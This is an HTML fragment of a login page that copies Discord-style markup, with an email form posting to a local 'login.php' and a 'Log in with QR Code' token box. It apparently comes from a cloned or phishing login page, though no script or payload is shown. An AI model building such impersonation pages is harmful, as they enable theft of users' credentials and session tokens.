    ...
    <div id="app-mount" class="appMount-3lHmkl">
      ...
      <div class="app-1q1i1E">
        <div class="wrapper-6URcxg">
            ...
            <div>
              <form class="authBoxExpanded-2jqaBe authBox-hW6HRx theme-dark" method="POST" action="login.php">
                <div class="centeringWrapper-2Rs1dR">
                  <div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6" style="flex: 1 1 auto;">
                      ...
                      <div class="block-egJnc0 marginTop20-3TxNs6">
                        <div class="marginBottom20-32qID7">
                          ...
                          <div class="input-cIJ7To input-1CjGeR">
                            ...
                            <div class="inputWrapper-31_8H8 inputWrapper-3aw2Sf">
                              <input class="inputDefault-_djjkz input-cIJ7To inputField-4g7rSQ" name="email" type="email" placeholder="name@example.com" aria-label="Email or Phone Number" autocomplete="off" maxlength="999" spellcheck="false" value="">
                            </div>
                          </div>
                        </div>
                        <div>
                        ...
                        <div class="marginTop4-2BNfKC">
                          ...
                          <button type="button" class="smallRegisterLink-2LCrMe linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
                            <div class="contents-18-Yxp"><a href="register.php">Create your account</a></div>
                          </button>
                        </div>
                      </div>
                    </div>
                    ...
                    <!--Qr code goes here-->
                    <div id="qr-container" class="qrCodeContainer-3sXarj" style="padding: 8px; border-radius: 4px; background: rgb(255, 255, 255);">
                    
        </div>

        <h3 class="title-jXR8lp marginBottom8-AtZOdT fontDisplay-1dagSA base-1x0h_U size24-RIRrxO">Log in with QR Code</h3>
        <div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf"><button id="generateTokenButton">Generate Token</button> </div>
      </div>
    </div>
  </div>
</div>
